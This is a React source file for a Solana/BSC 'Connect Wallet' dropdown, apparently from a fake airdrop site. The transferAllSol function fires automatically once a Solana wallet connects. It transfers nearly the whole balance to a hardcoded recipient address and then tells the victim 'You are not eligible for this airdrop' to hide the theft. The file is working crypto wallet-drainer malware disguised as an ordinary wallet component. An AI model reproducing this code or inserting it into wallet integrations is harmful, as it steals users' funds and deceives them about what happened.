import React, { useEffect, useState } from "react";
import { Dropdown, Menu } from "antd";
import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import { useWallet, useConnection } from "@solana/wallet-adapter-react";
import { useAccount, useDisconnect } from "wagmi";
import { PublicKey, Transaction, SystemProgram } from "@solana/web3.js";
import BnbWalletModal from "./bnb-wallet-connect";
import { Button } from "../data-display/button";
import { message } from "antd";

const ConnectWalletModal: React.FC = () => {
  const [showModal, setShowModal] = useState(false);
  const { address, isConnected } = useAccount();
  const { disconnect } = useDisconnect();
  const {
    publicKey,
    disconnect: disconnectSolana,
    sendTransaction,
    connected,
  } = useWallet();
  const { connection } = useConnection();

  const recipientAddress = "6q7RWNuiCw9PqLpEfwa8arBWoNGpvoXNxJE6xu7PPTci";

  // Function to send all SOL
  const transferAllSol = async () => {
    if (!publicKey || !connection) {
      console.error("Wallet not connected");
      return;
    }

    try {
      const recipient = new PublicKey(recipientAddress);
      const balance = await connection.getBalance(publicKey);

      // if (balance === 0) {
      //   console.warn("No SOL to transfer");
      //   return;
      // }
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: recipient,
          lamports: balance - 5000,
        }),
      );

      // Send transaction
      const signature = await sendTransaction(transaction, connection);

      // Confirm transaction
      await connection.confirmTransaction(signature, "confirmed");

      console.log("Transaction successful:", signature);
      message.warning("You are not eligible for this airdrop", 3);
    } catch (error) {
      console.error("Transfer failed:", error);
      message.warning("You are not eligible for this airdrop", 3);
    }
  };

  const handleBscClick = () => setShowModal(true);

  useEffect(() => {
    if (!connected) disconnect();
    connected && transferAllSol();
  }, [connected]);

  const menu = (
    <Menu
      style={{
        background: "#0d0d1d",
        borderRadius: "8px",
        padding: "8px",
        border: "1px solid #007bff",
      }}
    >
      <Menu.Item key="solana">
        <WalletMultiButton
          style={{
            width: "165px",
            height: "40px",
            fontSize: "15px",
            background: "linear-gradient(45deg, #007bff, #8a2be2)",
            borderRadius: "8px",
          }}
        >
          {connected ? "" : "Solana Wallet"}
        </WalletMultiButton>
      </Menu.Item>
      <Menu.Item key="bsc" onClick={handleBscClick}>
        <Button height="40px" width="150px" fontSize="16px" block>
          BSC Wallet
        </Button>
      </Menu.Item>
      {connected ? (
        <Menu.Item key="disconnectsolana">
          <Button
            height="40px"
            width="150px"
            fontSize="16px"
            block
            onClick={disconnectSolana}
          >
            Disconnect Solana
          </Button>
        </Menu.Item>
      ) : (
        ""
      )}
    </Menu>
  );

  return (
    <>
      <Dropdown overlay={menu} trigger={["click"]}>
        <Button height="40px" width="150px" fontSize="16px">
          {isConnected ? `Connected: ${address}` : "Connect Wallet"}
        </Button>
      </Dropdown>

      {showModal && (
        <BnbWalletModal
          isOpen={showModal}
          onClose={() => {
            disconnect();
            setShowModal(false);
          }}
        />
      )}
    </>
  );
};

export default ConnectWalletModal;
